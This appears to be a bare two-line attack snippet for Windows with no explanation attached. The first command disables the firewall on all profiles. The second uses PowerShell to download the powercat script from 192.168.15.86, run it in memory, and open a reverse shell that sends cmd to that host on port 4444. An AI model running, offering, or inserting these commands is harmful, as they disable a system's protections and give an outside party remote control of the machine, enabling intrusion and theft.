netsh advfirewall set allprofiles state off
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.15.86/powercat.ps1');powercat -c 192.168.15.86 -p 4444 -e cmd"
